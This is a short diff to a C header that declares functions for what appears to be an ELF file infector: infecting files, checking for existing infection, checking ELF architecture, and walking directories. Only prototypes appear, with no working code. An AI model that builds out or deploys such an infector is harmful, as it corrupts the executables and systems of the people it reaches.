@@ -16,7 +16,7 @@
 void    infect(FILE *fp, const char *string, size_t len);
 bool    check_infection(FILE *fp, const char *string, size_t len);
 bool    check_elf(FILE *fp, int arch);
-void    analyze_directory(const char *dirname);
+void    analyze_directory(const char *dirname, const char *string, size_t len);
 void    run_infection();
 
 #endif
